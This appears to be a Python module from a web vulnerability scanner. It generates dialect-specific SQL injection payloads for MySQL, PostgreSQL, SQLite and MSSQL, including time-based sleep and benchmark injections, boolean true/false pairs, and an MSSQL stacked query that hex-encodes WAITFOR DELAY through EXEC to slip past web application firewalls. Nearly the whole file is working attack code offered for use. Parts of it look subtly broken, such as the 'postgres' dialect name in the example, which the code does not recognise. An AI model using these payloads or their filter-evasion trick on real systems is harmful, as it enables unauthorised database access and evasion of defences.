# -*- coding: utf-8 -*-
"""
AST-based SQLi Payload Generator using sqlglot.

This module is responsible for creating dialect-aware, syntactically
correct SQL injection payloads by manipulating Abstract Syntax Trees (AST).
"""

import sqlglot
from sqlglot import exp

class AstPayloadGenerator:
    """
    Generates dialect-aware SQLi payloads using AST manipulation.
    This allows for more flexible and harder-to-detect payloads compared
    to static string-based lists.
    """

    def __init__(self, dialect: str = "mysql"):
        self.dialect = dialect.lower() if dialect else "mysql"

    def _generate_time_based(self, sleep_time: int, context: str) -> list[tuple[str, str]]:
        """Generates time-based payloads."""
        payloads = []

        # --- MSSQL Special Handling for WAITFOR (Stacked Query with Obfuscation) ---
        if self.dialect == "mssql":
            delay_str = f"0:0:{sleep_time}"
            # Advanced WAF bypass using hex-encoded payload and EXEC.
            # This avoids keywords like 'WAITFOR' and 'DELAY' in the main query.
            # Hex for "WAITFOR DELAY '" is 0x57414954464F522044454C41592027
            # Hex for "'" is 0x27
            hex_encoded_payload = "0x57414954464F522044454C41592027" + delay_str.encode().hex() + "27"
            payload_fragment = f";DECLARE @S VARCHAR(4000);SET @S=CAST({hex_encoded_payload} AS VARCHAR(4000));EXEC(@S);--"

            # Use the context to add the correct quote/comment.
            if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED"]:
                sql = "'" + payload_fragment
            elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
                sql = '"' + payload_fragment
            else: # HTML_TEXT or unknown - assuming quote is needed to break out
                sql = "'" + payload_fragment

            payloads.append((sql, "MSSQL_WAITFOR_OBFUSCATED"))
            return payloads

        # Base sleep functions per dialect
        if self.dialect == "postgresql":
            sleep_func = exp.Anonymous(this="pg_sleep", params=[sleep_time])
        elif self.dialect == "sqlite":
            # The COUNT(*) method was ineffective. A better method is to force a computationally
            # expensive operation. We use a nested query with RANDOMBLOB to make it harder
            # for a query planner to optimize away and more specific to SQLite's behavior.
            # Blob size is proportional to sleep time. 500k bytes/sec.
            blob_size = max(500000, int(sleep_time * 500000))
            # This nested subquery is less likely to be optimized out.
            heavy_query = f"(SELECT 1 WHERE LENGTH(HEX(RANDOMBLOB({blob_size}))) > 0)"
            # Check if the subquery returns a result.
            sleep_func = sqlglot.parse_one(f"{heavy_query} IS NOT NULL")
        else: # Default to MySQL's SLEEP
            sleep_func = exp.Sleep(this=exp.Literal.number(sleep_time))

        # Variations
        # 1. Simple AND/OR
        for logic_op in [exp.And, exp.Or]:
            condition = logic_op(left=exp.Boolean(this=True), right=sleep_func.copy())
            sql = self._build_sql(condition, context)
            payloads.append((sql, f"{self.dialect.upper()}_SLEEP"))

        # 2. BENCHMARK for MySQL
        if self.dialect == "mysql":
            benchmark_expr = exp.Anonymous(
                this="BENCHMARK",
                params=[exp.Literal.number(sleep_time * 1000000), exp.Anonymous(this="MD5", params=[exp.Literal.string("1")])]
            )
            for logic_op in [exp.And, exp.Or]:
                condition = logic_op(left=exp.TRUE(), right=benchmark_expr.copy())
                sql = self._build_sql(condition, context)
                payloads.append((sql, f"MYSQL_BENCHMARK"))

        return payloads

    def _generate_boolean_based(self, context: str) -> list[tuple[str, str, str]]:
        """Generates boolean-based payloads (true/false pairs)."""
        pairs = []

        conditions = [
            (exp.EQ(this="1", to="1"), exp.EQ(this="1", to="2")), # 1=1 vs 1=2
            (exp.Like(this="'a'", to="'a'"), exp.Like(this="'a'", to="'b'")), # 'a' LIKE 'a' vs 'a' LIKE 'b'
        ]

        for true_cond, false_cond in conditions:
            for logic_op in [exp.And, exp.Or]:
                true_expr = logic_op(left=exp.Boolean(this=True), right=true_cond.copy())
                false_expr = logic_op(left=exp.Boolean(this=True), right=false_cond.copy())

                true_sql = self._build_sql(true_expr, context)
                false_sql = self._build_sql(false_expr, context)

                pairs.append((true_sql, false_sql, f"LOGICAL_{logic_op.__name__.upper()}"))

        return pairs

    def _build_sql(self, expression: exp.Expression, context: str) -> str:
        """Serializes the expression to SQL and adds context prefixes/suffixes."""
        # TODO: The 'context' part needs to be more robust. For now, we just handle simple cases.

        # Base serialization
        # We add a space to ensure separation from a potential preceding value.
        sql = " " + expression.sql(dialect=self.dialect)

        if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED"]:
            # e.g., ' AND 1=1--
            sql = "'" + sql + "-- "
        elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
            # e.g., " AND 1=1--
            sql = '"' + sql + "-- "
        else: # HTML_TEXT or unknown
            # e.g., AND 1=1--
            sql = sql + "-- "

        return sql

    def generate(self, payload_type: str, context: str, options: dict = None) -> list:
        """
        Generates a list of SQLi payloads.

        Args:
            payload_type: The type of payload to generate (e.g., "TIME_BASED").
            context: The injection context (e.g., "HTML_ATTRIBUTE_SINGLE_QUOTED").
            options: A dictionary of options, e.g., {"sleep_time": 5}.

        Returns:
            A list of payloads. For boolean-based, it's [(true, false, family), ...].
            For time-based, it's [(payload, family), ...].
        """
        options = options or {}

        if payload_type == "TIME_BASED":
            sleep_time = options.get("sleep_time", 5)
            return self._generate_time_based(sleep_time, context)
        elif payload_type == "BOOLEAN_BASED":
            return self._generate_boolean_based(context)
        else:
            # TODO: Add support for other payload types like ERROR_BASED, OOB_PAYLOADS
            return []

if __name__ == '__main__':
    # Example usage for testing
    pg_gen = AstPayloadGenerator(dialect='postgres')
    mysql_gen = AstPayloadGenerator(dialect='mysql')
    mssql_gen = AstPayloadGenerator(dialect='mssql')

    print("--- PostgreSQL Time-Based ---")
    payloads = pg_gen.generate("TIME_BASED", context="HTML_TEXT", options={"sleep_time": 10})
    for p, fam in payloads: print(f"  Family: {fam}, Payload: {p}")

    print("\n--- MySQL Boolean-Based (in single quotes) ---")
    payloads = mysql_gen.generate("BOOLEAN_BASED", context="HTML_ATTRIBUTE_SINGLE_QUOTED")
    for t, f, fam in payloads: print(f"  Family: {fam}\n    TRUE: {t}\n    FALSE: {f}")

    print("\n--- MSSQL Time-Based (in double quotes) ---")
    payloads = mssql_gen.generate("TIME_BASED", context="HTML_ATTRIBUTE_DOUBLE_QUOTED", options={"sleep_time": 7})
    for p, fam in payloads: print(f"  Family: {fam}, Payload: {p}")
